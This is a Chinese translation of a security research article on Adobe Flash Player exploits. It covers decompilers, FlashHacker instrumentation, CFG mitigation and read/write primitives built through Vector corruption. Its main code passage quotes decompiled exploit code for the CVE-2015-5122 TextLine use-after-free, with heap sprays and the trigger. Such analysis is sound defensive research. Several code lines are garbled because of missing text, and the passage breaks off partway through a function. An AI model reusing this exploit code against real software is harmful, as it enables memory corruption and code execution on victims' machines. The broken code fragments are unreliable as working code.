原文链接：  
原作者：PI:EMAIL
译： **xd0ol1 (知道创宇404实验室)**
### 0 关于Adobe Flash Player的漏洞
随着近来Java插件和Web浏览器在安全防护措施上的提升，攻击者们开始重新关注起Adobe Flash Player来，并将其视作主要的漏洞利用攻击目标。
多年来，借助Vector结构的corruption一直是实现Flash漏洞利用的首选方案。Vector是Adobe Flash
Player中的一个数据结构，它以非常简洁的形式保存在native空间中，我们可以很容易的操纵此结构而不必担心其它字段会被破坏。而在引入Vector的长度保护后，攻击者们又转向了ByteArray结构的corruption（CVE-2015-7645）。
另一方面，CFG（Control Flow Guard）保护或者又叫CFI（Control Flow Integrity）保护是由Windows
8.1系统引入的，最新的Adobe Flash
Player中也用到了此技术。对exploit开发者来说利用对象vftable的corruption已经是很常见的技术了，CFG就是针对此提出的缓解策略，它将在vftable中的虚函数调用前进行有效性的判断，如果调用未被确认则会退出进程。
### 1 逆向分析方法
分析Adobe Flash
Player的exploit是一件非常具有挑战性的工作，由于缺少高效的字节码调试工具，这使得漏洞调试对安全研究人员来说简直就是一场噩梦，并且exploit的混淆处理通常都是一个单向的过程，任何试图反编译它们的行为都会产生警告。当然，确实也存在很多好用的反编译器，但它们通常在某些点上会执行失败，而且攻击者经常想出新的混淆方案来保护他们的exploit不被逆向。更糟的是除非你能获取源码，不然你还真没什么好的方法来验证反编译结果的准确性。由于反编译时的这种限制，在逆向过程中通常会用到多种分析工具及技术。
#### 1.1 反编译工具
事实上，还是有许多针对SWF文件的商业版和开源版反编译器。其中，[JPEXS Free Flash
Decompiler](https://github.com/jindrapetrik/jpexs-decompiler)是开源中较有用的反编译器之一，而对于商业版来说，[Action Script
Viewer](http://www.buraks.com/asv/)的反编译结果要好得多。限制这些工具的根本原因在于SWF文件中存在大量的混淆代码，这使得反编译几近不可能或者结果中包含有严重的错误。此外，一些反编译器只给出了它们能生成的最好结果，但对可能的错误却从不提供警告。
下面为其中一款反编译器处理过程中产生的错误，当出现“unresolved jump”错误时，在这附近的反编译结果往往不是那么准确。
     for (;_local_9  0)
      {
    -   fixups ~= Fixup(off, pos, instructionOffset);
    -   writeS24(0);
    +   //throw new Exception("Too few switch cases");
    +   writeU30(instruction.arguments[i].switchTargets.length-1);
    +   foreach (off; instruction.arguments[i].switchTargets)
    +   {
    +     fixups ~= Fixup(off, pos, instructionOffset);
    +     writeS24(0);
    +   }
      }
      break;
    }
图5 writeMethodBody函数中的补丁
#### 1.3 FlashHacker
[FlashHacker](https://github.com/ohjeongwook/FlashHacker)是一个开源的项目，它最初是基于ShmooCon
2012大会上提出的[相关概念](https://github.com/ohjeongwook/Publications/blob/master/Jeong_Wook_Oh_AVM%2520Inception%2520-%2520ShmooCon2012.pdf)而开发的原型。在此之上我们进行了二次开发，使之可以对更多的AVM字节码元素进行插桩，并提供了更详细的过滤选项。在进行AVM字节码插桩时，其中的一大挑战是由于CPU密集型计算而导致的性能下降。例如，借助插桩代码进行的堆喷操作通常会由于Flash
Player中的超时机制导致漏洞利用的失败。但我们仍然可以通过过滤这些CPU密集型计算的代码来执行精确操作，插桩技术通常适用于RCA（root cause
analysis）分析以及我们最近进行的有关保护措施绕过方面的研究。
#### 1.4 AVMPlus源码
要是能获取当前分析程序的源码，那么这无疑很有优势。我们可以在[AVMplus](https://github.com/adobe-flash/avmplus)项目中查看AVM的开源实现，这对理解一些漏洞利用程序的操作会很有帮助，我们甚至发现一些利用程序直接使用了AVMplus中的代码，比如其中的MMgc实现部分。
#### 1.5 Native层Flash调试
此外，除非我们能获取Flash程序的符号信息，否则在native层对Flash漏洞或exploit的调试都将是极富挑战性的。
### 2 RW primitives
“read/write
primitives”是指exploit中用于实现内存读写的对象或函数，现今的漏洞攻击通常需要借此来绕过ASLR或DEP等保护机制。而从防御者的角度来看，如果能知道exploit中所利用的RW
primitives，那么将有助于弄清exploit是采用何种方式来绕过诸如CFG这样的保护措施。
#### 2.1 Vector结构的corruption
自从CVE-2013-0634中引入Lady
Boyle的利用方式后，对Vector结构的corruption事实上就成了Flash漏洞利用的标准，甚至一些IE的漏洞（CVE-2013-3163，CVE-2014-0322和CVE-2014-1776）也用到了此方法。有关IE中Vector结构的利用详情，可以参考Chun
Feng和Elia
Florio所发的[文章](https://www.virusbulletin.com/uploads/pdf/conference/vb2014/VB2014-FengFlorio.pdf)。
下述的CVE-2015-5122（TextLine的UAF漏洞）利用代码就是通过标准的Vector结构corruption来实现RW
primitives，当把Vector.\和TextLine对象布局到内存中的相邻位置后，就可以触发use-after-free了。在此情况下，通过正常的Vector对象赋值操作就可将相邻Vector对象的length字段置为0x40000000。因此，这个corrupt后的Vector结构能被用作RW
primitives。
    public class MyClass extends MyUtils
    {
      ...
      static var _mc:MyClass;
      static var _vu:Vector.;
      static var LEN40:uint = 0x40000000;
      static function TryExpl()
      {
        ...
        _arLen1 = (0x0A * 0x03);
        _arLen2 = (_arLen1 + (0x04 * 0x04));
        _arLen = (_arLen2 + (0x0A * 0x08));
        _ar = new Array(_arLen);
        _mc = new MyClass();
        ...
        _vLen = ((0x0190 / 0x04) - 0x02);
        while (i (_vLen);
          i = (i + 1);
        };
图6 第一次Vector对象的喷射
    i = _arLen2;
    while (i (0x08);
      _ar[i][0x00] = i;
      i = (i + 1);
    };
    i = _arLen1;
图7 第二次Vector对象的喷射
    while (i < _arLen2)
    {
      _ar[i] = _tb.createTextLine(); //_tb is TextBlock object
      i = (i + 1);
    };
    i = _arLen1;
    while (i < _arLen2)
    {
      _ar[i].opaqueBackground = 0x01;
      i = (i + 1);
    };
图8 TextLine对象的喷射
在完成Vector和TextLine对象的喷射操作后，该exploit会将valueOf2赋给自身MyClass类中的prototype对象。
    MyClass.prototype.valueOf = valueOf2;
    _cnt = (_arLen2 - 0x06);
    _ar[_cnt].opaqueBackground = _mc; // Trigger use-after-free vulnerability (static var _mc:MyClass)
图9 触发UAF漏洞
接着，当_mc变量赋给opaqueBackground时valueOf2函数会被调用。
    static function valueOf2()
    {
      var i:int;
      try
      {
        if (++_cnt < _arLen2)
        {
          _ar[_cnt].opaqueBackground = _mc;
        }
        else
        {
          Log("MyClass.valueOf2()");
          i = 0x01;
          while (i <= 0x05)
          {
            _tb.recreateTextLine(_ar[(_arLen2 - i)]); // Trigger use-after-free condition
            i = (i + 1);
          };
          i = _arLen2;